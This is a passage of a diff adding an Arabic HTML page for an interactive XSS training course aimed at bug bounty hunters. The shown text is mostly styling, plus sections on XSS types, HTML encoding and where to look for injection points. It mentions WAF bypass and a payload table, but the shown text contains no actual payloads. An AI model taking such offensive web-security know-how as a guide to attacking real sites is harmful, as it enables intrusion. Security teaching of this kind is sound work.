@@ -1,0 +1,1799 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Mastery Academy | أكاديمية إتقان XSS</title>
+  <meta name="description" content="تعلم XSS من الصفر لمستوى Bug Bounty Hunter — رحلة تعليمية تفاعلية كاملة بالعربية">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Fira+Code:wght@400;500;600&family=Outfit:wght@600;800;900&display=swap" rel="stylesheet">
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #030712;
+      --bg-2: #0a0f1e;
+      --bg-3: #0f172a;
+      --card: #0b1120;
+      --border: #1e293b;
+      --border-glow: #334155;
+      --cyan: #06b6d4;
+      --cyan-dim: rgba(6,182,212,0.12);
+      --orange: #f97316;
+      --orange-dim: rgba(249,115,22,0.12);
+      --gold: #eab308;
+      --green: #22c55e;
+      --red: #ef4444;
+      --blue: #3b82f6;
+      --purple: #a855f7;
+      --text: #f1f5f9;
+      --muted: #64748b;
+      --subtle: #94a3b8;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Cairo', sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* ── Scrollbar ── */
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--border-glow); border-radius: 99px; }
+
+    /* ── Global Utility ── */
+    .container { max-width: 1400px; margin: 0 auto; padding: 0 24px; }
+    .section { padding: 60px 0; }
+    .section-title {
+      font-size: clamp(1.4rem, 2.5vw, 1.9rem);
+      font-weight: 800;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .section-title .num {
+      background: var(--cyan-dim);
+      border: 1px solid var(--cyan);
+      color: var(--cyan);
+      font-family: 'Outfit', sans-serif;
+      font-size: 0.85rem;
+      padding: 4px 12px;
+      border-radius: 99px;
+    }
+    .section-sub { color: var(--muted); font-size: 0.95rem; margin-bottom: 30px; }
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 24px;
+      transition: border-color 0.3s, box-shadow 0.3s;
+    }
+    .card:hover { border-color: var(--border-glow); }
+    .tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 4px 12px;
+      border-radius: 99px;
+      font-size: 0.78rem;
+      font-weight: 700;
+    }
+    .tag.cyan { background: var(--cyan-dim); color: var(--cyan); border: 1px solid var(--cyan); }
+    .tag.orange { background: var(--orange-dim); color: var(--orange); border: 1px solid var(--orange); }
+    .tag.green { background: rgba(34,197,94,0.1); color: var(--green); border: 1px solid var(--green); }
+    .tag.red { background: rgba(239,68,68,0.1); color: var(--red); border: 1px solid var(--red); }
+    .tag.purple { background: rgba(168,85,247,0.1); color: var(--purple); border: 1px solid var(--purple); }
+    .tag.gold { background: rgba(234,179,8,0.1); color: var(--gold); border: 1px solid var(--gold); }
+    .glow-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: linear-gradient(135deg, var(--cyan), var(--blue));
+      color: #000;
+      font-family: 'Cairo', sans-serif;
+      font-weight: 800;
+      font-size: 0.9rem;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 0 20px rgba(6,182,212,0.25);
+    }
+    .glow-btn:hover { transform: translateY(-2px); box-shadow: 0 0 30px rgba(6,182,212,0.45); }
+    .outline-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: transparent;
+      color: var(--cyan);
+      font-family: 'Cairo', sans-serif;
+      font-weight: 700;
+      font-size: 0.85rem;
+      padding: 10px 20px;
+      border: 1px solid var(--cyan);
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .outline-btn:hover { background: var(--cyan-dim); }
+    pre, code { font-family: 'Fira Code', monospace !important; }
+
+    /* ──────────────────────────────────────────
+       TOP NAV / HEADER
+    ────────────────────────────────────────── */
+    .top-nav {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: rgba(3,7,18,0.85);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+      padding: 14px 24px;
+    }
+    .nav-inner {
+      max-width: 1400px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+    .nav-brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-decoration: none;
+    }
+    .nav-logo {
+      width: 40px; height: 40px;
+      background: linear-gradient(135deg, var(--cyan), var(--blue));
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.4rem;
+    }
+    .nav-title { font-size: 1.1rem; font-weight: 800; color: var(--text); }
+    .nav-sub { font-size: 0.75rem; color: var(--muted); }
+    .nav-xp-pill {
+      display: flex; align-items: center; gap: 8px;
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-radius: 99px;
+      padding: 6px 16px;
+      font-size: 0.85rem;
+    }
+    .xp-dot { width: 8px; height: 8px; background: var(--gold); border-radius: 50%; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.5;transform:scale(1.3)} }
+    .rank-badge {
+      background: linear-gradient(135deg, var(--gold), var(--orange));
+      color: #000;
+      font-weight: 800;
+      font-size: 0.75rem;
+      padding: 3px 10px;
+      border-radius: 99px;
+    }
+
+    /* ──────────────────────────────────────────
+       HERO
+    ────────────────────────────────────────── */
+    .hero {
+      padding: 70px 24px 50px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: -100px; left: 50%; transform: translateX(-50%);
+      width: 600px; height: 600px;
+      background: radial-gradient(circle, rgba(6,182,212,0.08) 0%, transparent 70%);
+      pointer-events: none;
+    }
+    .hero-eyebrow {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: var(--cyan-dim);
+      border: 1px solid var(--cyan);
+      color: var(--cyan);
+      font-weight: 700;
+      font-size: 0.85rem;
+      padding: 6px 18px;
+      border-radius: 99px;
+      margin-bottom: 20px;
+    }
+    .hero-title {
+      font-size: clamp(2.2rem, 5vw, 3.5rem);
+      font-weight: 900;
+      line-height: 1.15;
+      margin-bottom: 16px;
+    }
+    .hero-title span { background: linear-gradient(90deg, var(--cyan), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+    .hero-desc { color: var(--subtle); font-size: 1.1rem; max-width: 600px; margin: 0 auto 30px; line-height: 1.7; }
+    .hero-stats {
+      display: flex; align-items: center; justify-content: center; gap: 30px;
+      flex-wrap: wrap;
+    }
+    .hero-stat { text-align: center; }
+    .hero-stat strong { font-size: 1.6rem; font-weight: 900; color: var(--cyan); }
+    .hero-stat span { font-size: 0.8rem; color: var(--muted); display: block; }
+
+    /* ──────────────────────────────────────────
+       PROGRESS BAR HEADER
+    ────────────────────────────────────────── */
+    .progress-header {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 20px 28px;
+      margin: 0 24px 50px;
+      max-width: 1400px;
+      margin-left: auto;
+      margin-right: auto;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+    .prog-item { flex: 1; min-width: 160px; }
+    .prog-label { font-size: 0.8rem; color: var(--muted); margin-bottom: 6px; }
+    .prog-val { font-size: 1.1rem; font-weight: 800; color: var(--text); }
+    .prog-bar { background: var(--bg-3); height: 8px; border-radius: 99px; margin-top: 6px; overflow: hidden; }
+    .prog-fill { height: 100%; border-radius: 99px; transition: width 0.5s ease; }
+    .prog-fill.cyan { background: linear-gradient(90deg, var(--cyan), var(--blue)); }
+    .prog-fill.gold { background: linear-gradient(90deg, var(--gold), var(--orange)); }
+
+    /* ──────────────────────────────────────────
+       PHASE 0: KNOWLEDGE MAP
+    ────────────────────────────────────────── */
+    .map-wrapper {
+      overflow-x: auto;
+      padding-bottom: 10px;
+    }
+    .node-tree-svg {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      min-width: 700px;
+    }
+    .tree-row {
+      display: flex;
+      align-items: center;
+      gap: 0;
+    }
+    .tree-node {
+      position: relative;
+      padding: 10px 18px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: var(--bg-3);
+      font-weight: 700;
+      font-size: 0.88rem;
+      white-space: nowrap;
+      cursor: pointer;
+      transition: all 0.25s;
+      user-select: none;
+    }
+    .tree-node:hover, .tree-node.active { border-color: var(--cyan); color: var(--cyan); background: var(--cyan-dim); box-shadow: 0 0 12px rgba(6,182,212,0.2); }
+    .tree-node.root { border-color: var(--orange); color: var(--orange); background: var(--orange-dim); font-size: 1rem; padding: 12px 22px; }
+    .tree-node.green-node { border-color: var(--green); color: var(--green); background: rgba(34,197,94,0.1); }
+    .tree-line { width: 30px; height: 2px; background: var(--border-glow); flex-shrink: 0; }
+    .tree-branch {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      position: relative;
+    }
+    .tree-branch::before {
+      content: '';
+      position: absolute;
+      right: 100%;
+      top: 50%;
+      width: 30px;
+      height: 2px;
+      background: var(--border-glow);
+    }
+
+    /* ──────────────────────────────────────────
+       PHASE 3: WORKFLOW STEPPER
+    ────────────────────────────────────────── */
+    .stepper {
+      display: flex;
+      align-items: flex-start;
+      gap: 0;
+      overflow-x: auto;
+      padding-bottom: 10px;
+    }
+    .step-item {
+      flex: 1;
+      min-width: 120px;
+      text-align: center;
+      position: relative;
+    }
+    .step-item:not(:last-child)::after {
+      content: '';
+      position: absolute;
+      top: 22px;
+      left: 50%;
+      width: 100%;
+      height: 2px;
+      background: var(--border-glow);
+      z-index: 0;
+    }
+    .step-item.done::after { background: var(--cyan); }
+    .step-circle {
+      width: 44px; height: 44px;
+      border-radius: 50%;
+      background: var(--bg-3);
+      border: 2px solid var(--border-glow);
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 10px;
+      font-weight: 800;
+      font-size: 0.9rem;
+      position: relative;
+      z-index: 1;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .step-item.done .step-circle { background: var(--cyan); border-color: var(--cyan); color: #000; }
+    .step-item.active .step-circle { border-color: var(--cyan); color: var(--cyan); box-shadow: 0 0 15px rgba(6,182,212,0.4); }
+    .step-label { font-size: 0.78rem; color: var(--muted); line-height: 1.4; }
+    .step-item.active .step-label { color: var(--cyan); font-weight: 700; }
+
+    .step-detail {
+      margin-top: 24px;
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      display: none;
+    }
+    .step-detail.visible { display: block; animation: fadeIn 0.3s; }
+    @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
+
+    /* ──────────────────────────────────────────
+       PHASE 4: INTERACTIVE LAB
+    ────────────────────────────────────────── */
+    .lab-tabs {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+    }
+    .lab-tab {
+      padding: 8px 18px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: var(--bg-3);
+      color: var(--muted);
+      font-family: 'Cairo', sans-serif;
+      font-weight: 700;
+      font-size: 0.85rem;
+      cursor: pointer;
+      transition: all 0.25s;
+    }
+    .lab-tab.active { border-color: var(--cyan); color: var(--cyan); background: var(--cyan-dim); }
+    .lab-area { display: none; }
+    .lab-area.active { display: block; animation: fadeIn 0.3s; }
+
+    .browser-frame {
+      background: #070a13;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: hidden;
+    }
+    .browser-bar {
+      background: var(--bg-3);
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid var(--border);
+    }
+    .dot-red { width:10px;height:10px;border-radius:50%;background:#ef4444; }
+    .dot-yel { width:10px;height:10px;border-radius:50%;background:#eab308; }
+    .dot-grn { width:10px;height:10px;border-radius:50%;background:#22c55e; }
+    .browser-url { flex: 1; background: var(--bg); border: 1px solid var(--border); border-radius: 5px; padding: 4px 10px; font-family: 'Fira Code', monospace; font-size: 0.75rem; color: var(--muted); }
+    .browser-body { padding: 20px; }
+    .search-sim {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+    .search-sim input {
+      flex: 1;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px 14px;
+      color: var(--text);
+      font-family: 'Fira Code', monospace;
+      font-size: 0.9rem;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    .search-sim input:focus { border-color: var(--cyan); }
+    .search-sim button {
+      background: var(--cyan);
+      border: none;
+      border-radius: 8px;
+      padding: 10px 20px;
+      color: #000;
+      font-weight: 800;
+      font-family: 'Cairo', sans-serif;
+      cursor: pointer;
+    }
+    .output-box {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 14px;
+      min-height: 50px;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.85rem;
+      color: var(--subtle);
+    }
+
+    .hint-accordion { margin-top: 16px; }
+    .hint-btn {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px 14px;
+      color: var(--gold);
+      font-weight: 700;
+      font-size: 0.85rem;
+      cursor: pointer;
+      margin-bottom: 6px;
+      transition: all 0.25s;
+    }
+    .hint-btn:hover { border-color: var(--gold); background: rgba(234,179,8,0.08); }
+    .hint-body {
+      background: rgba(234,179,8,0.05);
+      border: 1px solid rgba(234,179,8,0.2);
+      border-radius: 8px;
+      padding: 12px 14px;
+      font-size: 0.85rem;
+      color: var(--subtle);
+      display: none;
+      margin-bottom: 8px;
+    }
+    .hint-body.open { display: block; animation: fadeIn 0.2s; }
+
+    /* ──────────────────────────────────────────
+       PHASE 5: PAYLOAD TABLE
+    ────────────────────────────────────────── */
+    .payload-table { width: 100%; border-collapse: collapse; }
+    .payload-table th {
+      text-align: right;
+      padding: 10px 14px;
+      color: var(--muted);
+      font-size: 0.8rem;
+      border-bottom: 1px solid var(--border);
+      font-weight: 700;
+    }
+    .payload-table td {
+      padding: 12px 14px;
+      border-bottom: 1px solid var(--border);
+      font-size: 0.85rem;
+      vertical-align: middle;
+    }
+    .payload-table tr:last-child td { border-bottom: none; }
+    .payload-table tr:hover td { background: rgba(255,255,255,0.02); }
+    .copy-btn {
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 5px 12px;
+      color: var(--cyan);
+      font-size: 0.78rem;
+      cursor: pointer;
+      font-family: 'Cairo', sans-serif;
+      transition: all 0.2s;
+    }
+    .copy-btn:hover { background: var(--cyan-dim); border-color: var(--cyan); }
+
+    /* ──────────────────────────────────────────
+       PHASE 6: DOM XSS
+    ────────────────────────────────────────── */
+    .dom-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+    @media(max-width:700px){.dom-grid{grid-template-columns:1fr;}}
+
+    /* ──────────────────────────────────────────
+       PHASE 7: SCENARIO
+    ────────────────────────────────────────── */
+    .scenario-flow {
+      display: flex;
+      align-items: center;
+      gap: 0;
+      overflow-x: auto;
+      padding-bottom: 10px;
+    }
+    .scenario-step {
+      flex-shrink: 0;
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 14px 16px;
+      text-align: center;
+      min-width: 130px;
+      cursor: pointer;
+      transition: all 0.25s;
+      font-size: 0.82rem;
+    }
+    .scenario-step:hover { border-color: var(--orange); color: var(--orange); }
+    .scenario-step .icon { font-size: 1.5rem; margin-bottom: 5px; }
+    .scenario-arrow { color: var(--border-glow); font-size: 1.4rem; padding: 0 8px; flex-shrink: 0; }
+
+    /* ──────────────────────────────────────────
+       PHASE 8: IMPACT
+    ────────────────────────────────────────── */
+    .impact-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+    @media(max-width:700px){.impact-grid{grid-template-columns:1fr;}}
+    .impact-card {
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .impact-card:hover { border-color: var(--red); box-shadow: 0 0 20px rgba(239,68,68,0.1); }
+    .impact-card .icon { font-size: 2.5rem; margin-bottom: 10px; }
+    .impact-card h4 { font-size: 0.9rem; font-weight: 800; margin-bottom: 6px; }
+    .impact-card p { font-size: 0.78rem; color: var(--muted); }
+
+    /* ──────────────────────────────────────────
+       PHASE 9: REPORT
+    ────────────────────────────────────────── */
+    .report-form { display: flex; flex-direction: column; gap: 16px; }
+    .form-group { display: flex; flex-direction: column; gap: 6px; }
+    .form-group label { font-size: 0.85rem; font-weight: 700; color: var(--subtle); }
+    .form-group input, .form-group textarea, .form-group select {
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px 14px;
+      color: var(--text);
+      font-family: 'Cairo', sans-serif;
+      font-size: 0.9rem;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    .form-group input:focus, .form-group textarea:focus, .form-group select:focus { border-color: var(--cyan); }
+    .form-group textarea { min-height: 90px; resize: vertical; }
+    .report-output {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.82rem;
+      line-height: 1.7;
+      white-space: pre-wrap;
+      color: var(--subtle);
+      display: none;
+    }
+    .report-output.visible { display: block; animation: fadeIn 0.3s; }
+
+    /* ──────────────────────────────────────────
+       LEADERBOARD SIDEBAR
+    ────────────────────────────────────────── */
+    .lb-wrapper {
+      position: sticky;
+      top: 80px;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 20px;
+      height: fit-content;
+    }
+    .lb-title { font-size: 0.85rem; color: var(--muted); font-weight: 700; margin-bottom: 14px; display: flex; align-items: center; gap: 6px; }
+    .lb-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px;
+      border-radius: 8px;
+      margin-bottom: 6px;
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      font-size: 0.85rem;
+      transition: all 0.25s;
+    }
+    .lb-row.me { border-color: var(--orange); background: var(--orange-dim); color: var(--orange); }
+    .lb-rank { font-family: 'Outfit', sans-serif; font-weight: 900; font-size: 1rem; min-width: 24px; text-align: center; }
+
+    /* ──────────────────────────────────────────
+       LAYOUT: MAIN + SIDEBAR
+    ────────────────────────────────────────── */
+    .page-layout {
+      display: grid;
+      grid-template-columns: 1fr 260px;
+      gap: 30px;
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 0 24px;
+      align-items: start;
+    }
+    @media(max-width:1000px){.page-layout{grid-template-columns:1fr;}}
+    .sidebar-col { display: flex; flex-direction: column; gap: 16px; }
+    @media(max-width:1000px){.sidebar-col{display:none;}}
+
+    /* mentor bubble */
+    .mentor-bubble {
+      background: rgba(168,85,247,0.08);
+      border: 1px solid rgba(168,85,247,0.25);
+      border-radius: 12px;
+      padding: 16px;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+    .mentor-avatar {
+      width: 38px; height: 38px; flex-shrink: 0;
+      background: linear-gradient(135deg, var(--purple), var(--blue));
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.2rem;
+    }
+    .mentor-text { font-size: 0.82rem; color: var(--subtle); line-height: 1.6; }
+    .mentor-text strong { color: var(--purple); }
+
+    /* secure coding toggle */
+    .code-compare { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 14px; }
+    @media(max-width:700px){.code-compare{grid-template-columns:1fr;}}
+    .code-block {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .code-header {
+      padding: 8px 14px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      display: flex; align-items: center; gap: 6px;
+    }
+    .code-header.vuln { background: rgba(239,68,68,0.1); color: var(--red); }
+    .code-header.safe { background: rgba(34,197,94,0.1); color: var(--green); }
+    .code-block pre { padding: 14px; font-size: 0.8rem; color: var(--subtle); overflow-x: auto; }
+
+    /* toast */
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: var(--green);
+      color: #000;
+      font-weight: 800;
+      font-size: 0.9rem;
+      padding: 12px 24px;
+      border-radius: 99px;
+      display: none;
+      z-index: 9999;
+      box-shadow: 0 10px 30px rgba(34,197,94,0.4);
+      animation: slideUp 0.3s forwards;
+    }
+    @keyframes slideUp { from{opacity:0;transform:translateX(-50%) translateY(20px)} to{opacity:1;transform:translateX(-50%) translateY(0)} }
+    .xp-flash {
+      position: fixed;
+      top: 80px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(135deg, var(--gold), var(--orange));
+      color: #000;
+      font-weight: 900;
+      font-size: 1.2rem;
+      padding: 14px 30px;
+      border-radius: 12px;
+      display: none;
+      z-index: 9999;
+      box-shadow: 0 10px 30px rgba(234,179,8,0.4);
+    }
+
+    /* divider */
+    .section-divider {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+
+<!-- ── TOP NAV ── -->
+<nav class="top-nav">
+  <div class="nav-inner">
+    <a href="#" class="nav-brand">
+      <div class="nav-logo">🛡️</div>
+      <div>
+        <div class="nav-title">XSS Mastery Academy</div>
+        <div class="nav-sub">أكاديمية إتقان XSS — Abdo Cyber Academy</div>
+      </div>
+    </a>
+    <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+      <div class="nav-xp-pill">
+        <div class="xp-dot"></div>
+        <span id="nav-xp">0 XP</span>
+      </div>
+      <div class="rank-badge" id="nav-rank">🟢 Beginner</div>
+    </div>
+  </div>
+</nav>
+
+<!-- ── HERO ── -->
+<div class="hero">
+  <div class="container">
+    <div class="hero-eyebrow">⚡ من الصفر لمستوى Bug Bounty Hunter</div>
+    <h1 class="hero-title">
+      أكاديمية إتقان <span>XSS</span><br>الكاملة
+    </h1>
+    <p class="hero-desc">
+      رحلة تعليمية تفاعلية من 9 مراحل — تبحث، تخطئ، تتلمح، تحل، تفهم السبب، تعرف الإصلاح، وتكتب التقرير الاحترافي.
+    </p>
+    <div class="hero-stats">
+      <div class="hero-stat"><strong>9</strong><span>مراحل تعليمية</span></div>
+      <div class="hero-stat"><strong>4</strong><span>مستويات Lab</span></div>
+      <div class="hero-stat"><strong>20+</strong><span>Payload جاهز</span></div>
+      <div class="hero-stat"><strong>∞</strong><span>تعلم مجاني</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ── PROGRESS HEADER ── -->
+<div class="container">
+  <div class="progress-header">
+    <div class="prog-item">
+      <div class="prog-label">🏆 المستوى الحالي</div>
+      <div class="prog-val" id="ph-rank">Beginner 🟢</div>
+      <div class="prog-bar"><div class="prog-fill cyan" id="ph-xp-bar" style="width:0%"></div></div>
+    </div>
+    <div class="prog-item">
+      <div class="prog-label">⚡ نقاط XP</div>
+      <div class="prog-val" id="ph-xp">0 / 1000 XP</div>
+      <div class="prog-bar"><div class="prog-fill gold" id="ph-lab-bar" style="width:0%"></div></div>
+    </div>
+    <div class="prog-item">
+      <div class="prog-label">🧪 Labs المكتملة</div>
+      <div class="prog-val" id="ph-labs">0 / 4</div>
+    </div>
+    <div class="prog-item">
+      <div class="prog-label">📜 الشهادات</div>
+      <div class="prog-val" id="ph-cert">لم تُكتسب بعد</div>
+    </div>
+  </div>
+</div>
+
+<!-- ── MAIN LAYOUT ── -->
+<div class="page-layout">
+
+  <!-- MAIN COLUMN -->
+  <main>
+
+    <!-- ═══════════════════════════════════════
+         PHASE 0: KNOWLEDGE MAP
+    ═══════════════════════════════════════ -->
+    <section class="section">
+      <div class="section-title">
+        <span class="num">Phase 0</span>
+        🗺️ XSS Knowledge Map
+      </div>
+      <p class="section-sub">اضغط على أي عقدة لعرض الشرح التفصيلي</p>
+
+      <div class="card">
+        <div class="map-wrapper">
+          <!-- FULL TREE -->
+          <div style="display:flex;align-items:center;gap:0;min-width:750px;">
+
+            <!-- ROOT -->
+            <div class="tree-node root" onclick="showMapDetail('root')">XSS</div>
+            <div style="display:flex;flex-direction:column;gap:18px;margin-right:20px;position:relative;">
+              <!-- vertical connector -->
+              <div style="position:absolute;right:0;top:25px;bottom:25px;width:2px;background:var(--border-glow);"></div>
+
+              <!-- ROW: Reflected -->
+              <div style="display:flex;align-items:center;gap:0;">
+                <div style="width:20px;height:2px;background:var(--border-glow);"></div>
+                <div class="tree-node active" onclick="showMapDetail('reflected')">Reflected</div>
+                <div style="width:20px;height:2px;background:var(--border-glow);"></div>
+                <div class="tree-node" onclick="showMapDetail('getpost')">GET/POST</div>
+                <div style="width:20px;height:2px;background:var(--border-glow);"></div>
+                <div class="tree-node" onclick="showMapDetail('filter')">Filter</div>
+                <div style="width:20px;height:2px;background:var(--border-glow);"></div>
+                <div class="tree-node" onclick="showMapDetail('waf')">WAF Bypass</div>
+              </div>
+
+              <!-- ROW: Stored -->
+              <div style="display:flex;align-items:center;gap:0;">
+                <div style="width:20px;height:2px;background:var(--border-glow);"></div>
+                <div class="tree-node" onclick="showMapDetail('stored')">Stored</div>
+                <div style="width:20px;height:2px;background:var(--border-glow);"></div>
+                <div class="tree-node" onclick="showMapDetail('database')">Database</div>
+                <div style="width:20px;height:2px;background:var(--border-glow);"></div>
+                <div class="tree-node" onclick="showMapDetail('adminview')">Admin View</div>
+              </div>
+
+              <!-- ROW: DOM -->
+              <div style="display:flex;align-items:center;gap:0;">
+                <div style="width:20px;height:2px;background:var(--border-glow);"></div>
+                <div class="tree-node green-node" onclick="showMapDetail('dom')">DOM</div>
+                <div style="width:20px;height:2px;background:var(--border-glow);"></div>
+                <div class="tree-node" onclick="showMapDetail('javascript')">JavaScript</div>
+                <div style="width:20px;height:2px;background:var(--border-glow);"></div>
+                <div class="tree-node" onclick="showMapDetail('sourcesink')">Source/Sink</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div id="map-detail" class="step-detail" style="margin-top:16px;display:none;">
+          <div id="map-detail-content"></div>
+        </div>
+      </div>
+    </section>
+    <hr class="section-divider">
+
+    <!-- ═══════════════════════════════════════
+         PHASE 1: WEB FOUNDATION
+    ═══════════════════════════════════════ -->
+    <section class="section">
+      <div class="section-title">
+        <span class="num">Phase 1</span>
+        🌐 Web Foundation — HTML/JS Context
+      </div>
+      <p class="section-sub">فهم كيف يعمل المتصفح قبل أي اختبار</p>
+
+      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;">
+        <div class="card">
+          <div style="font-size:1.5rem;margin-bottom:10px;">📄</div>
+          <h3 style="font-size:1rem;font-weight:800;margin-bottom:8px;">HTML Parsing</h3>
+          <p style="color:var(--muted);font-size:0.85rem;line-height:1.6;">المتصفح يحول HTML إلى DOM tree. أي نص يُدرج مباشرة بدون Encoding يمكن أن يُنفَّذ كـ Tag حقيقية.</p>
+          <div style="margin-top:12px;background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:12px;">
+            <code style="font-size:0.8rem;color:var(--red);">&lt;div&gt;Hello USERDATA&lt;/div&gt;</code><br>
+            <code style="font-size:0.8rem;color:var(--green);">&lt;div&gt;Hello &amp;lt;script&amp;gt;&lt;/div&gt;</code>
+          </div>
+        </div>
+
+        <div class="card">
+          <div style="font-size:1.5rem;margin-bottom:10px;">🏷️</div>
+          <h3 style="font-size:1rem;font-weight:800;margin-bottom:8px;">Execution Contexts</h3>
+          <p style="color:var(--muted);font-size:0.85rem;line-height:1.6;">لكل مكان في الصفحة سياق مختلف — نص HTML، داخل Attribute، داخل JavaScript، داخل CSS.</p>
+          <div style="margin-top:12px;display:flex;flex-wrap:wrap;gap:6px;">
+            <span class="tag cyan">HTML Body</span>
+            <span class="tag orange">Attribute</span>
+            <span class="tag green">JavaScript</span>
+            <span class="tag purple">CSS</span>
+          </div>
+        </div>
+
+        <div class="card">
+          <div style="font-size:1.5rem;margin-bottom:10px;">🔒</div>
+          <h3 style="font-size:1rem;font-weight:800;margin-bottom:8px;">لماذا يحدث XSS؟</h3>
+          <p style="color:var(--muted);font-size:0.85rem;line-height:1.6;">عندما يُعيد التطبيق إدخال المستخدم في الصفحة بدون تشفيره (Encoding) أو التحقق منه (Validation).</p>
+          <div class="mentor-bubble" style="margin-top:12px;">
+            <div style="font-size:1.2rem;">💡</div>
+            <div style="font-size:0.8rem;color:var(--subtle);">الثغرة ليست في المتصفح — هي في الكود الخاطئ للتطبيق.</div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <hr class="section-divider">
+
+    <!-- ═══════════════════════════════════════
+         PHASE 2: DISCOVERY ENGINE
+    ═══════════════════════════════════════ -->
+    <section class="section">
+      <div class="section-title">
+        <span class="num">Phase 2</span>
+        🔍 XSS Discovery Engine
+      </div>
+      <p class="section-sub">أين تبحث عن ثغرات XSS؟ — جميع السطوح الهجومية</p>
+
+      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:14px;">
+        <div class="card" style="cursor:pointer;" onclick="expandSurface(this,'Search')">
+          <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;">
+            <span style="font-size:1.4rem;">🔎</span>
